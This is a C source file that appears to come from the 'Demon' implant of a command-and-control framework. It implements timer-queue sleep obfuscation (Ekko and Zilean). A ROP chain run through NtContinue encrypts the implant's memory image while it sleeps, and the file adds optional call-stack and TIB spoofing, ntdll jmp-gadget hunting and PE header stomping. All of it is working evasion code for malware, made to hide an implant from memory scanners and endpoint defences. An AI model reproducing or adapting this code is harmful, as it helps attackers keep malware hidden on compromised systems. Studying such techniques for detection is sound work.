#ifdef SLEEPOBF_USE_TIMER

#include <Demon.h>

#include <common/Macros.h>
#include <core/Memory.h>
#include <core/SleepObf.h>
#include <core/PeProtect.h>
#include <core/Win32.h>
#include <core/MiniStd.h>
#include <core/Thread.h>

#include <ntstatus.h>

#if _WIN64

BOOL TimerObf(
    _In_ ULONG TimeOut,
    _In_ ULONG Method
) {
    /* Handles */
    HANDLE   Queue     = { 0 };
    HANDLE   Timer     = { 0 };
    HANDLE   ThdSrc    = { 0 };
    HANDLE   EvntStart = { 0 };
    HANDLE   EvntTimer = { 0 };
    HANDLE   EvntDelay = { 0 };
    HANDLE   EvntWait  = { 0 };
    UCHAR    Buf[ 44 ] = { 0 };  /* max for ChaCha20: 32-byte key + 12-byte nonce */
    USTRING  Key       = { 0 };
    USTRING  Img       = { 0 };
    PVOID    ImgBase   = { 0 };
    ULONG    ImgSize   = { 0 };
    CONTEXT  TimerCtx  = { 0 };
    CONTEXT  ThdCtx    = { 0 };
    CONTEXT  Rop[ 13 ] = { 0 };
    ULONG    Value     = { 0 };
    ULONG    Delay     = { 0 };
    BOOL     Success   = { 0 };
    NT_TIB   NtTib     = { 0 };
    NT_TIB   BkpTib    = { 0 };
    NTSTATUS NtStatus  = { 0 };
    ULONG    Inc       = { 0 };
    LPVOID   ImageBase = { 0 };
    SIZE_T   ImageSize = { 0 };
    LPVOID   TxtBase   = { 0 };
    SIZE_T   TxtSize   = { 0 };
    ULONG    Protect   = { 0 };
    BYTE     JmpBypass = { 0 };
    PVOID    JmpGadget = { 0 };
    BYTE     JmpPad[]  = { 0xFF, 0xE0 };
    SIZE_T   ScanLen   = { 0 };
    PVOID    ScanBase  = { 0 };

    ImageBase = TxtBase = Instance->Session.ModuleBase;
    ImageSize = TxtSize = Instance->Session.ModuleSize;
    Protect   = PAGE_EXECUTE_READWRITE;
    JmpBypass = Instance->Config.Implant.SleepJmpBypass;

    PRINTF( "TimerObf: ENTRY TimeOut=%lu Method=%lu (%s) JmpBypass=%d StackSpoof=%d ImageBase=%p ImageSize=%llu\n",
            TimeOut, Method,
            Method == SLEEPOBF_EKKO ? "EKKO" : Method == SLEEPOBF_ZILEAN ? "ZILEAN" : "?",
            JmpBypass, Instance->Config.Implant.StackSpoof,
            ImageBase, (unsigned long long) ImageSize )

    if ( Instance->Session.TxtBase && Instance->Session.TxtSize ) {
        TxtBase = Instance->Session.TxtBase;
        TxtSize = Instance->Session.TxtSize;
        Protect = PAGE_EXECUTE_READ;
        PRINTF( "TimerObf: using .text section TxtBase=%p TxtSize=%llu Protect=PAGE_EXECUTE_READ\n",
                TxtBase, (unsigned long long) TxtSize )
    } else {
        PUTS( "TimerObf: using full image (no .text section info)" )
    }

    /* create a random key; length depends on cipher: 16 bytes for RC4, 44 bytes for ChaCha20 */
    DWORD KeyLen = ( Instance->Config.Implant.SleepCipher == SLEEP_CIPHER_CHACHA20 ) ? 44 : 16;
    for ( DWORD i = 0; i < KeyLen; i++ ) {
        Buf[ i ] = (UCHAR)RandomNumber32();
    }

    /* set specific context flags */
    ThdCtx.ContextFlags = TimerCtx.ContextFlags = CONTEXT_FULL;

    /* set key pointer and size */
    Key.Buffer = Buf;
    Key.Length = Key.MaximumLength = (WORD)KeyLen;

    /* set agent memory pointer and size */
    Img.Buffer = ImgBase           = Instance->Session.ModuleBase;
    Img.Length = Img.MaximumLength = ImgSize = Instance->Session.ModuleSize;

    if ( Method == SLEEPOBF_EKKO ) {
        NtStatus = Instance->Win32.RtlCreateTimerQueue( &Queue );
        PRINTF( "TimerObf: RtlCreateTimerQueue NtStatus=%lx Queue=%p\n", NtStatus, Queue )
    } else if ( Method == SLEEPOBF_ZILEAN ) {
        NtStatus = Instance->Win32.NtCreateEvent( &EvntWait, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
        PRINTF( "TimerObf: NtCreateEvent (EvntWait) NtStatus=%lx EvntWait=%p\n", NtStatus, EvntWait )
    }

    if ( NT_SUCCESS( NtStatus ) )
    {
        /* create events */
        if ( NT_SUCCESS( NtStatus = Instance->Win32.NtCreateEvent( &EvntTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
             NT_SUCCESS( NtStatus = Instance->Win32.NtCreateEvent( &EvntStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
             NT_SUCCESS( NtStatus = Instance->Win32.NtCreateEvent( &EvntDelay, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
        {
            /* get the context of the Timer thread based on the method used */
            if ( Method == SLEEPOBF_EKKO ) {
                NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance->Win32.RtlCaptureContext ), &TimerCtx, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );
            } else if ( Method == SLEEPOBF_ZILEAN ) {
                NtStatus = Instance->Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( Instance->Win32.RtlCaptureContext ), &TimerCtx, Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD );
            }

            if ( NT_SUCCESS( NtStatus ) )
            {
                /* Send event that we got the context of the timers thread */
                if ( Method == SLEEPOBF_EKKO ) {
                    NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( EventSet ), EvntTimer, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD );
                } else if ( Method == SLEEPOBF_ZILEAN ) {
                    NtStatus = Instance->Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( EventSet ), EvntTimer, Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD );
                }

                if ( NT_SUCCESS( NtStatus ) )
                {
                    /* wait til we successfully retrieved the timers thread context */
                    if ( ! NT_SUCCESS( NtStatus = SysNtWaitForSingleObject( EvntTimer, FALSE, NULL ) ) ) {
                        PRINTF( "Failed waiting for starting event: %lx\n", NtStatus )
                        goto LEAVE;
                    }

                    /* if stack spoofing is enabled then prepare some stuff */
                    if ( Instance->Config.Implant.StackSpoof )
                    {
                        /* retrieve Tib if stack spoofing is enabled */
                        if ( ! ThreadQueryTib( C_PTR( TimerCtx.Rsp ), &NtTib ) ) {
                            PUTS( "Failed to retrieve Tib" )
                            goto LEAVE;
                        }

                        /* duplicate the current thread we are going to spoof the stack */
                        if ( ! NT_SUCCESS( NtStatus = SysNtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &ThdSrc, 0, 0, DUPLICATE_SAME_ACCESS ) ) ) {
                            PRINTF( "NtDuplicateObject Failed: %lx\n", NtStatus )
                            goto LEAVE;
                        }

                        /* NtTib backup */
                        MemCopy( &BkpTib, &Instance->Teb->NtTib, sizeof( NT_TIB ) );
                    }

                    /* restrict gadget scan to ntdll .text (executable) section only — FF E0 bytes
                     * also appear in non-exec sections (.rdata, .pdata, .reloc); a randomly
                     * selected non-exec address causes an NX fault in the timer pool thread */
                    {
                        PIMAGE_DOS_HEADER     Dos = ( PIMAGE_DOS_HEADER ) Instance->Modules.Ntdll;
                        PIMAGE_NT_HEADERS     Nts = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
                        PIMAGE_SECTION_HEADER Sec = RVA( PIMAGE_SECTION_HEADER, &Nts->OptionalHeader, Nts->FileHeader.SizeOfOptionalHeader );

                        /* default fallback: scan past the PE header across the full image */
                        ScanBase = C_PTR( U_PTR( Dos ) + LDR_GADGET_HEADER_SIZE );
                        ScanLen  = Nts->OptionalHeader.SizeOfImage;
                        ScanLen  = ( ScanLen > LDR_GADGET_HEADER_SIZE ) ? ( ScanLen - LDR_GADGET_HEADER_SIZE ) : LDR_GADGET_MODULE_SIZE;

                        /* prefer the first executable section (.text) — guaranteed to be executable */
                        for ( USHORT i = 0; i < Nts->FileHeader.NumberOfSections; i++, Sec++ ) {
                            if ( Sec->Characteristics & 0x20000000 ) { /* IMAGE_SCN_MEM_EXECUTE */
                                ScanBase = C_PTR( U_PTR( Dos ) + Sec->VirtualAddress );
                                ScanLen  = Sec->Misc.VirtualSize ? Sec->Misc.VirtualSize : Sec->SizeOfRawData;
                                break;
                            }
                        }
                        PRINTF( "TimerObf: ntdll gadget scan base=%p len=%llu\n", ScanBase, (unsigned long long) ScanLen )
                    }

                    /* search for jmp instruction */
                    if ( JmpBypass )
                    {
                        /* change padding to "jmp rbx" */
                        if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) {
                            JmpPad[ 1 ] = 0x23;
                        }

                        /* use random gadget selection when RandGadget is enabled, first-match otherwise */
                        if ( Instance->Config.Implant.RandGadget ) {
                            PRINTF( "TimerObf: RandGadget=ON searching gadget JmpBypass=%d\n", JmpBypass )
                            JmpGadget = MmGadgetFindRandom(
                                ScanBase,
                                ScanLen,
                                JmpPad,
                                sizeof( JmpPad )
                            );
                        } else {
                            PRINTF( "TimerObf: RandGadget=OFF searching gadget JmpBypass=%d\n", JmpBypass )
                            JmpGadget = MmGadgetFind(
                                ScanBase,
                                ScanLen,
                                JmpPad,
                                sizeof( JmpPad )
                            );
                        }

                        if ( ! JmpGadget ) {
                            PUTS( "TimerObf: gadget NOT FOUND, downgrading to JMPRAX_NONE" )
                            JmpBypass = SLEEPOBF_BYPASS_NONE;
                        } else {
                            PRINTF( "TimerObf: gadget found at %p\n", JmpGadget )
                        }
                    }

                    /* pre-flight: print all Win32 pointers used in the ROP chain so NULL is obvious */
                    PRINTF( "TimerObf: fn-ptr WaitForSingleObjectEx=%p VirtualProtect=%p SleepCipherFunc=%p NtSetEvent=%p NtContinue=%p\n",
                            Instance->Win32.WaitForSingleObjectEx, Instance->Win32.VirtualProtect,
                            Instance->Win32.SleepCipherFunc, Instance->Win32.NtSetEvent,
                            Instance->Win32.NtContinue )
                    if ( Instance->Config.Implant.StackSpoof ) {
                        PRINTF( "TimerObf: fn-ptr NtGetContextThread=%p RtlCopyMappedMemory=%p NtSetContextThread=%p ThdSrc=%p\n",
                                Instance->Win32.NtGetContextThread, Instance->Win32.RtlCopyMappedMemory,
                                Instance->Win32.NtSetContextThread, ThdSrc )
                    }

                    /* at this point we can start preparing the ROPs and execute the timers */
                    for ( int i = 0; i < 13; i++ ) {
                        MemCopy( &Rop[ i ], &TimerCtx, sizeof( CONTEXT ) );
                        Rop[ i ].Rip  = U_PTR( JmpGadget );
                        Rop[ i ].Rsp -= sizeof( PVOID );
                    }

                    /* Start of Ropchain */
                    OBF_JMP( Inc, Instance->Win32.WaitForSingleObjectEx );
                    Rop[ Inc ].Rcx = U_PTR( EvntStart );
                    Rop[ Inc ].Rdx = U_PTR( INFINITE );
                    Rop[ Inc ].R8  = U_PTR( FALSE );
                    Inc++;

                    /* Protect */
                    OBF_JMP( Inc, Instance->Win32.VirtualProtect );
                    Rop[ Inc ].Rcx = U_PTR( ImgBase );
                    Rop[ Inc ].Rdx = U_PTR( ImgSize );
                    Rop[ Inc ].R8  = U_PTR( PAGE_READWRITE );
                    Rop[ Inc ].R9  = U_PTR( &Value );
                    Inc++;

                    /* Encrypt image base address */
                    OBF_JMP( Inc, Instance->Win32.SleepCipherFunc );
                    Rop[ Inc ].Rcx = U_PTR( &Img );
                    Rop[ Inc ].Rdx = U_PTR( &Key );
                    Inc++;

                    /* perform stack spoofing */
                    if ( Instance->Config.Implant.StackSpoof ) {
                        OBF_JMP( Inc, Instance->Win32.NtGetContextThread )
                        Rop[ Inc ].Rcx = U_PTR( ThdSrc  );
                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx );
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
                        Rop[ Inc ].Rcx = U_PTR( &TimerCtx.Rip );
                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx.Rip );
                        Rop[ Inc ].R8  = U_PTR( sizeof( PVOID ) ); /* copy full 8-byte RIP, not 1 byte (sizeof(VOID)=1 in GCC) */
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
                        Rop[ Inc ].Rcx = U_PTR( &Instance->Teb->NtTib );
                        Rop[ Inc ].Rdx = U_PTR( &NtTib );
                        Rop[ Inc ].R8  = U_PTR( sizeof( NT_TIB ) );
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.NtSetContextThread )
                        Rop[ Inc ].Rcx = U_PTR( ThdSrc    );
                        Rop[ Inc ].Rdx = U_PTR( &TimerCtx );
                        Inc++;
                    }

                    /* Sleep */
                    OBF_JMP( Inc, Instance->Win32.WaitForSingleObjectEx )
                    Rop[ Inc ].Rcx = U_PTR( NtCurrentProcess() );
                    Rop[ Inc ].Rdx = U_PTR( Delay + TimeOut );
                    Rop[ Inc ].R8  = U_PTR( FALSE );
                    Inc++;

                    /* undo stack spoofing */
                    if ( Instance->Config.Implant.StackSpoof ) {
                        OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
                        Rop[ Inc ].Rcx = U_PTR( &Instance->Teb->NtTib );
                        Rop[ Inc ].Rdx = U_PTR( &BkpTib );
                        Rop[ Inc ].R8  = U_PTR( sizeof( NT_TIB ) );
                        Inc++;

                        OBF_JMP( Inc, Instance->Win32.NtSetContextThread )
                        Rop[ Inc ].Rcx = U_PTR( ThdSrc  );
                        Rop[ Inc ].Rdx = U_PTR( &ThdCtx );
                        Inc++;
                    }

                    /* Decrypt image */
                    OBF_JMP( Inc, Instance->Win32.SleepCipherFunc )
                    Rop[ Inc ].Rcx = U_PTR( &Img );
                    Rop[ Inc ].Rdx = U_PTR( &Key );
                    Inc++;

                    /* Protect */
                    OBF_JMP( Inc, Instance->Win32.VirtualProtect )
                    Rop[ Inc ].Rcx = U_PTR( TxtBase );
                    Rop[ Inc ].Rdx = U_PTR( TxtSize );
                    Rop[ Inc ].R8  = U_PTR( Protect );
                    Rop[ Inc ].R9  = U_PTR( &Value );
                    Inc++;

                    /* End of Ropchain */
                    OBF_JMP( Inc, Instance->Win32.NtSetEvent )
                    Rop[ Inc ].Rcx = U_PTR( EvntDelay );
                    Rop[ Inc ].Rdx = U_PTR( NULL );
                    Inc++;

                    PRINTF( "TimerObf: Rops to be executed: %d (TimeOut=%lu Delay base=%lu)\n", Inc, TimeOut, Delay )

                    /* dump each ROP entry so NULL function pointers and wrong args are visible */
                    for ( int i = 0; i < Inc; i++ ) {
                        PRINTF( "TimerObf: Rop[%02d] Rip=%p Rax=%p Rcx=%p Rdx=%p R8=%p R9=%p Rsp=%p\n",
                                i,
                                C_PTR( Rop[ i ].Rip ),
                                C_PTR( Rop[ i ].Rax ),
                                C_PTR( Rop[ i ].Rcx ),
                                C_PTR( Rop[ i ].Rdx ),
                                C_PTR( Rop[ i ].R8  ),
                                C_PTR( Rop[ i ].R9  ),
                                C_PTR( Rop[ i ].Rsp ) )
                    }

                    /* execute/queue the timers */
                    for ( int i = 0; i < Inc; i++ ) {
                        if ( Method == SLEEPOBF_EKKO ) {
                            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance->Win32.NtContinue ), &Rop[ i ], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
                                PRINTF( "TimerObf: RtlCreateTimer[%d] Failed: %lx\n", i, NtStatus )
                                goto LEAVE;
                            }
                        } else if ( Method == SLEEPOBF_ZILEAN ) {
                            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlRegisterWait( &Timer, EvntWait, C_PTR( Instance->Win32.NtContinue ), &Rop[ i ], Delay += 100, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD ) ) ) {
                                PRINTF( "TimerObf: RtlRegisterWait[%d] Failed: %lx\n", i, NtStatus )
                                goto LEAVE;
                            }
                        }
                    }
                    PUTS( "TimerObf: all ROPs queued, signaling EvntStart and waiting for EvntDelay" )

                    PUTS( "TimerObf: calling PeProtect_Stomp" )
                    PeProtect_Stomp();
                    PUTS( "TimerObf: PeProtect_Stomp done, entering SysNtSignalAndWaitForSingleObject" )

                    /* just wait for the sleep to end */
                    if ( ! ( Success = NT_SUCCESS( NtStatus = SysNtSignalAndWaitForSingleObject( EvntStart, EvntDelay, FALSE, NULL ) ) ) ) {
                        PRINTF( "TimerObf: NtSignalAndWaitForSingleObject Failed: %lx\n", NtStatus );
                    } else {
                        PUTS( "TimerObf: sleep cycle completed, EvntDelay signaled" )
                    }
                    PeProtect_Restore();
                } else {
                    PRINTF( "RtlCreateTimer/RtlRegisterWait Failed: %lx\n", NtStatus )
                }
            } else {
                PRINTF( "RtlCreateTimer/RtlRegisterWait Failed: %lx\n", NtStatus )
            }
        } else {
            PRINTF( "NtCreateEvent Failed: %lx\n", NtStatus )
        }
    } else {
        PRINTF( "RtlCreateTimerQueue/NtCreateEvent Failed: %lx\n", NtStatus )
    }

LEAVE: /* cleanup */
    PUTS( "TimerObf: cleanup begin" )
    if ( Queue ) {
        Instance->Win32.RtlDeleteTimerQueue( Queue );
        Queue = NULL;
    }

    if ( EvntTimer ) {
        SysNtClose( EvntTimer );
        EvntTimer = NULL;
    }

    if ( EvntStart ) {
        SysNtClose( EvntStart );
        EvntStart = NULL;
    }

    if ( EvntDelay ) {
        SysNtClose( EvntDelay );
        EvntDelay = NULL;
    }

    if ( EvntWait ) {
        SysNtClose( EvntWait );
        EvntWait = NULL;
    }

    if ( ThdSrc ) {
        SysNtClose( ThdSrc );
        ThdSrc = NULL;
    }

    /* clear the structs from stack */
    for ( int i = 0; i < 13; i++ ) {
        RtlSecureZeroMemory( &Rop[ i ], sizeof( CONTEXT ) );
    }

    /* clear key from memory */
    RtlSecureZeroMemory( Buf, sizeof( Buf ) );

    PRINTF( "TimerObf: EXIT Success=%d\n", Success )
    return Success;
}

#endif /* _WIN64 */

#endif /* SLEEPOBF_USE_TIMER */
